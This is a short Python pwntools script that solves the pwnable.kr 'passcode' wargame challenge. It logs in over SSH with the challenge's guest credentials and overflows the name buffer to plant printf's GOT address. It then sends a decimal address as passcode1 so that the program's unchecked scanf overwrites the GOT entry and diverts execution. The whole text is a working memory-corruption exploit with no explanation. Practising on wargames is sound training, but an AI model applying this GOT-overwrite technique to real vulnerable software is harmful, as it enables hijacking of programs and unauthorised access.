from pwn import *
from zio3 import *
ssh = ssh(host='pwnable.kr',port =2222, user='passcode',password='guest')
sh = ssh.process(executable='./passcode')
printf_got=0x0804a000
payload1 = b'a'*(0x70-0x10)+l32(printf_got)
sys_addr=0x080485e3
payload2=str(sys_addr)
sh.recvuntil("enter you name :")
#sh.recvline()
sh.sendline(payload1)
sh.recvuntil("enter passcode1 :")
#sh.recvline()
sh.sendline(payload2)
print(sh.recvall())
